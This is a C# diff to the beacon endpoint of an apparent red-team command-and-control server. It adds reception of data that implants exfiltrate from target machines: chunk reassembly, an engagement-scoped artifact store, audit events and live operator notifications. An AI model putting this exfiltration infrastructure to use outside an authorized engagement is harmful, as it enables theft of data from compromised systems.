@@ -16,20 +16,26 @@ using Task = System.Threading.Tasks.Task;
 namespace Rod.Transport.Endpoints;
 
 /// <summary>
-/// The implant-initiated beacon stream (roadmap M1.3, tasking added M1.4). An
-/// implant opens a long-lived reverse connection; the first frame it sends is the
-/// handshake (payload = <see cref="HandshakeRequest"/>), and the first frame the
-/// server writes back is the <see cref="HandshakeResponse"/>. On a successful
-/// handshake the implant opens a session in its engagement and the stream
-/// becomes the tasking channel: the server pushes queued tasks
-/// (<see cref="TaskRequest"/>) downstream and captures the implant's results
-/// (<see cref="TaskResult"/>) upstream, writing each completed task to the audit
-/// trail. When the stream closes the session is closed.
+/// The implant-initiated beacon stream (roadmap M1.3, tasking added M1.4, exfil
+/// capture added under ADR 0004). An implant opens a long-lived reverse
+/// connection; the first frame it sends is the handshake
+/// (payload = <see cref="HandshakeRequest"/>), and the first frame the server
+/// writes back is the <see cref="HandshakeResponse"/>. On a successful handshake
+/// the implant opens a session in its engagement and the stream becomes the
+/// tasking channel: the server pushes queued tasks (<see cref="TaskRequest"/>)
+/// downstream and captures the implant's results (<see cref="TaskResult"/>)
+/// upstream, writing each completed task to the audit trail. The same channel
+/// also carries <see cref="ExfilChunk"/> frames when an implant streams an
+/// artifact off the target; the server reassembles those into the
+/// engagement-scoped artifact store. When the stream closes the session is
+/// closed.
 ///
 /// When a result is captured the stream also publishes a
 /// <see cref="LiveEventKind.TaskCompleted"/> event on the live bus (roadmap
 /// M2.4), so every connected operator session sees the outcome in real time;
 /// the audit write is the durable record, the live event the transient fan-out.
+/// The same fan-out is used for exfil captures so a live operator sees an
+/// artifact arrive without re-polling the artifact endpoint.
 ///
 /// mTLS is terminated at Kestrel before this handler runs: the presenting client
 /// certificate has already chained to the CA. The application-layer identity
@@ -44,6 +50,7 @@ internal sealed class BeaconEndpoint : Beacon.BeaconBase
     private readonly ISessionRegistry _sessions;
     private readonly TaskService _tasks;
     private readonly IAuditStore _audit;
+    private readonly IArtifactStore _artifacts;
     private readonly ILiveEventBus _bus;
 
     public BeaconEndpoint(
@@ -51,12 +58,14 @@ internal sealed class BeaconEndpoint : Beacon.BeaconBase
         ISessionRegistry sessions,
         TaskService tasks,
         IAuditStore audit,
+        IArtifactStore artifacts,
         ILiveEventBus bus)
     {
         _handshake = handshake;
         _sessions = sessions;
         _tasks = tasks;
         _audit = audit;
+        _artifacts = artifacts;
         _bus = bus;
     }
 
@@ -116,10 +125,16 @@ internal sealed class BeaconEndpoint : Beacon.BeaconBase
         // 3. The session is now open and the stream is the tasking channel. Hold
         //    it open, draining results and pushing queued tasks; close the session
         //    when the connection ends -- whether the implant closed cleanly or the
-        //    stream was aborted.
+        //    stream was aborted. The session context (engagement/implant/operator)
+        //    is threaded down so the frame handler can attribute exfil chunks
+        //    without re-deriving it from each task record.
+        var sessionContext = new SessionContext(
+            implant,
+            handshake.EngagementId,
+            handshake.DeployedBy);
         try
         {
-            await RunSessionAsync(implant, requestStream, responseStream, context.CancellationToken);
+            await RunSessionAsync(sessionContext, requestStream, responseStream, context.CancellationToken);
         }
         finally
         {
@@ -140,14 +155,18 @@ internal sealed class BeaconEndpoint : Beacon.BeaconBase
     // (clean client close in the reader, cancellation) ends the session; the
     // offline finally above runs regardless.
     private async Task RunSessionAsync(
-        ImplantId implant,
+        SessionContext session,
         IAsyncStreamReader<Frame> requestStream,
         IServerStreamWriter<Frame> responseStream,
         CancellationToken cancellationToken)
     {
         using var linked = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
-        var reader = ReadResultsAsync(requestStream, linked.Token);
-        var writer = DispatchTasksAsync(implant, responseStream, linked.Token);
+        // Per-stream chunk reassembly buffer. The endpoint is resolved per RPC,
+        // so this dictionary lives for the life of one beacon stream; the reader
+        // loop is the sole writer, so it needs no extra synchronization.
+        var exfil = new ExfilReassembler();
+        var reader = ReadResultsAsync(session, requestStream, exfil, linked.Token);
+        var writer = DispatchTasksAsync(session.Implant, responseStream, linked.Token);
 
         // Whichever finishes first cancels the other. The writer only ever ends
         // via cancellation (its loop runs for the session), so swallow the
@@ -164,15 +183,18 @@ internal sealed class BeaconEndpoint : Beacon.BeaconBase
         }
     }
 
-    // Reader: await each result frame, capture it into the task and append the
-    // audit event. Ends on a clean client close (MoveNext returns false); throws
-    // on an abort. Non-result frames are ignored for now (keepalives, etc.).
+    // Reader: await each upstream frame, capture it into the task and append the
+    // audit event, or -- when the frame is an ExfilChunk -- reassemble and store
+    // the artifact. Ends on a clean client close (MoveNext returns false);
+    // throws on an abort.
     private async Task ReadResultsAsync(
+        SessionContext session,
         IAsyncStreamReader<Frame> requestStream,
+        ExfilReassembler exfil,
         CancellationToken cancellationToken)
     {
         while (await requestStream.MoveNext(cancellationToken))
-            await HandleFrameAsync(requestStream.Current, cancellationToken);
+            await HandleFrameAsync(session, requestStream.Current, exfil, cancellationToken);
     }
 
     // Writer: poll the queue and push each queued task downstream. Operators task
@@ -235,12 +257,38 @@ internal sealed class BeaconEndpoint : Beacon.BeaconBase
         await responseStream.WriteAsync(frame);
     }
 
-    // A result frame: capture the outcome into the task and append the audit
-    // event. This is the transport-layer composition the M1.4 AC calls for --
-    // task state lives in core, the audit event in the audit layer, and the
-    // beacon stream is where both meet on a completed task (architecture.md
-    // Sec 10.3/11).
-    private async Task HandleFrameAsync(Frame frame, CancellationToken cancellationToken)
+    // An upstream frame: dispatch on its kind. TASK_RESULT (and the legacy
+    // UNSPECIFIED default, which older implants still send) takes the
+    // capture-and-audit path; EXFIL_CHUNK reassembles a streamed artifact into
+    // the artifact store. Non-result, non-exfil frames are ignored for now
+    // (keepalives, etc.). This is the transport-layer composition the M1.4 AC
+    // calls for -- task state lives in core, the audit event in the audit
+    // layer, and the beacon stream is where both meet on a completed task
+    // (architecture.md Sec 10.3/11).
+    private async Task HandleFrameAsync(
+        SessionContext session,
+        Frame frame,
+        ExfilReassembler exfil,
+        CancellationToken cancellationToken)
+    {
+        switch (frame.Kind)
+        {
+            case FrameKind.ExfilChunk:
+                await HandleExfilChunkAsync(session, frame, exfil, cancellationToken);
+                return;
+            case FrameKind.TaskResult:
+            case FrameKind.Unspecified:
+            default:
+                await HandleTaskResultAsync(frame, cancellationToken);
+                return;
+        }
+    }
+
+    // A TaskResult frame: capture the outcome into the task and append the audit
+    // event, then fan the completion out to connected operators. Pre-dates the
+    // FrameKind discriminator: UNSPECIFIED frames fall through here too so older
+    // implants keep working.
+    private async Task HandleTaskResultAsync(Frame frame, CancellationToken cancellationToken)
     {
         TaskResult result;
         try
@@ -295,6 +343,81 @@ internal sealed class BeaconEndpoint : Beacon.BeaconBase
                 completed.TaskId,
                 payload: $"{completed.Outcome}: {completed.Output}",
                 completed.CompletedAt),
+            cancellationToken);
+    }
+
+    // An ExfilChunk frame: buffer it in the per-stream reassembler keyed by
+    // (task id, artifact name); on the terminal chunk, build the artifact,
+    // save it scoped to the engagement, and append an ExfilCaptured audit
+    // event. The artifact is bound to the task that triggered the push (the
+    // implant stamps the task id on each chunk before sending), so it lands in
+    // the same engagement-scoped store as operator-attached artifacts.
+    private async Task HandleExfilChunkAsync(
+        SessionContext session,
+        Frame frame,
+        ExfilReassembler exfil,
+        CancellationToken cancellationToken)
+    {
+        ExfilChunk chunk;
+        try
+        {
+            chunk = ExfilChunk.Parser.ParseFrom(frame.Payload);
+        }
+        catch (InvalidProtocolBufferException)
+        {
+            return; // Malformed chunk; ignore rather than tearing down the stream.
+        }
+
+        if (!Guid.TryParse(chunk.TaskId, out var taskId))
+            return;
+
+        var terminal = exfil.Append(taskId, chunk, out var reassembled);
+        if (!terminal)
+            return;
+
+        // The terminal chunk closes the stream: build the artifact from the
+        // reassembled bytes, save it scoped to the engagement and bound to the
+        // task, and record the capture in the audit trail.
+        var artifactId = Guid.NewGuid();
+        var now = DateTimeOffset.UtcNow;
+        var artifact = new Artifact(
+            ArtifactId: artifactId,
+            EngagementId: session.EngagementId.Value,
+            TaskId: taskId,
+            OperatorId: session.OperatorId.Value,
+            Name: reassembled.Name,
+            ContentType: reassembled.ContentType,
+            Content: reassembled.Data,
+            Size: reassembled.Data.Length,
+            StoredAt: now);
+
+        await _artifacts.SaveAsync(artifact, cancellationToken);
+
+        await _audit.AppendAsync(
+            AuditEvent.Fact(
+                eventId: Guid.NewGuid(),
+                engagementId: session.EngagementId.Value,
+                operatorId: session.OperatorId.Value,
+                implantId: session.Implant.Value,
+                taskId: taskId,
+                verb: "exfil.push",
+                kind: AuditEventKind.ExfilCaptured,
+                payload: $"{artifact.Name};{artifact.ContentType}",
+                output: null,
+                outcome: artifactId.ToString("N"),
+                at: now),
+            cancellationToken);
+
+        // Fan the capture out to connected operator sessions so a live operator
+        // sees the artifact arrive without re-polling the artifact endpoint.
+        await _bus.PublishAsync(
+            LiveEvent.TaskCompleted(
+                session.EngagementId,
+                session.OperatorId,
+                session.Implant,
+                new TaskId(taskId),
+                payload: $"exfil: {artifact.Name};{artifact.ContentType}",
+                now),
             cancellationToken);
     }
 
@@ -366,4 +489,58 @@ internal sealed class BeaconEndpoint : Beacon.BeaconBase
         var frame = new Frame { Payload = ByteString.CopyFrom(response.ToByteArray()) };
         return stream.WriteAsync(frame);
     }
+
+    // The identity triplet threaded from CheckIn down to the frame handler. The
+    // handshake resolves all three once; passing them as a single value keeps
+    // the handler signatures short and avoids re-deriving engagement/operator
+    // from each task record (exfil chunks carry a task id but the operator who
+    // deployed the implant is not on the task the way it is on TaskCompleted).
+    private sealed record SessionContext(
+        ImplantId Implant,
+        EngagementId EngagementId,
+        OperatorId OperatorId);
+
+    // Reassembles ExfilChunk frames into a single byte buffer keyed by
+    // (task id, artifact name). The beacon reader loop is the sole writer, so a
+    // plain Dictionary is safe here without extra locking; the per-RPC lifetime
+    // (the endpoint is resolved per stream) keeps incomplete buffers from one
+    // session leaking into another. A terminal chunk flushes the buffer and
+    // reports the reassembled bytes back to the caller.
+    private sealed class ExfilReassembler
+    {
+        private readonly Dictionary<Key, Buffer> _buffers = new();
+
+        public bool Append(Guid taskId, ExfilChunk chunk, out Reassembled reassembled)
+        {
+            reassembled = default;
+            var key = new Key(taskId, chunk.Name);
+            if (!_buffers.TryGetValue(key, out var buffer))
+            {
+                buffer = new Buffer(chunk.Name, chunk.ContentType);
+                _buffers[key] = buffer;
+            }
+            buffer.Data.AddRange(chunk.Data);
+
+            if (!chunk.Terminal)
+                return false;
+
+            _buffers.Remove(key);
+            reassembled = new Reassembled(buffer.Name, buffer.ContentType, buffer.Data.ToArray());
+            return true;
+        }
+
+        private readonly record struct Key(Guid TaskId, string Name);
+
+        private sealed class Buffer(string name, string contentType)
+        {
+            public string Name { get; } = name;
+            public string ContentType { get; } = contentType;
+            public List<byte> Data { get; } = new();
+        }
+    }
+
+    // The reassembled artifact payload handed back from the ExfilReassembler on
+    // a terminal chunk: the name and content type the implant declared plus the
+    // concatenated bytes of every chunk in the stream.
+    private readonly record struct Reassembled(string Name, string ContentType, byte[] Data);
 }
